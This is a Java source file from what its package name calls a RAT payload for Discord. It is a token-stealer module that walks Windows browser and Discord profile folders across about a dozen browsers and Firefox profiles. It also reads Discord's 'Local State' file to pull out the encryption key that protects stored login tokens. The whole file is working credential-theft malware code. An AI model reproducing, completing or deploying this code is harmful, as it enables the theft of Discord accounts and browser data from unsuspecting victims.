//Raddon On Top!

package org.rat.payload.payloads.discord;

import java.util.*;
import java.io.*;
import org.json.*;
import java.nio.file.*;

public class Manager
{
    public final String ROAMING;
    public final String LOCAL;
    public ArrayList<String> paths;
    
    public Manager() {
        this.ROAMING = System.getenv("APPDATA");
        this.LOCAL = System.getenv("LOCALAPPDATA");
        this.paths = new ArrayList<String>();
    }
    
    public ArrayList<String> getPaths() {
        this.addPath(Paths.get(this.LOCAL, "360Browser", "Browser", "User Data", "Default"));
        this.addPath(Paths.get(this.LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"));
        this.addPath(Paths.get(this.LOCAL, "CocCoc", "Browser", "User Data", "Default"));
        this.addPath(Paths.get(this.LOCAL, "Epic Privacy Browser", "User Data", "Default"));
        this.addPath(Paths.get(this.LOCAL, "Google", "Chrome Beta", "User Data", "Default"));
        this.addPath(Paths.get(this.LOCAL, "Google", "Chrome", "User Data", "Default"));
        this.addPath(Paths.get(this.LOCAL, "Microsoft", "Edge", "User Data", "Default"));
        this.addPath(Paths.get(this.LOCAL, "Vivaldi", "User Data", "Default"));
        this.addPath(Paths.get(this.LOCAL, "Yandex", "YandexBrowser", "User Data", "Default"));
        this.addPath(Paths.get(this.ROAMING, "Opera Software", "Opera GX"));
        this.addPath(Paths.get(this.ROAMING, "Opera Software", "Opera Stable"));
        this.addPath(Paths.get(this.ROAMING, "discord"));
        this.addPath(Paths.get(this.ROAMING, "discordcanary"));
        this.addPath(Paths.get(this.ROAMING, "discordptb"));
        this.parseFirefoxProfiles(Paths.get(this.ROAMING, "Mozilla", "Firefox"));
        return this.paths;
    }
    
    public void addPath(final Path path) {
        if (path.toFile().exists()) {
            final String fpath = path.toFile().getAbsolutePath().toLowerCase();
            if (fpath.contains("roaming") && fpath.contains("discord")) {
                try (final BufferedReader br = new BufferedReader(new FileReader(Paths.get(path.toString(), "Local State").toFile()))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        Checker.osKey = new JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key");
                    }
                }
                catch (Exception ex) {}
            }
            this.paths.add(path.toString());
        }
    }
    
    public void parseFirefoxProfiles(final Path path) {
        if (path.toFile().exists()) {
            try {
                Files.list(Paths.get(path.toString(), "Profiles")).limit(100L).forEach(folder -> {
                    if (folder.toFile().getName().endsWith("release")) {
                        try {
                            Files.list(Paths.get(folder.toFile().getAbsolutePath(), "storage", "default")).limit(100L).forEach(file -> {
                                if (file.toFile().getName().contains("discord")) {
                                    this.addPath(Paths.get(file.toFile().getAbsolutePath(), "ls"));
                                }
                            });
                        }
                        catch (Exception ex) {}
                    }
                });
            }
            catch (Exception ex2) {}
        }
    }
}
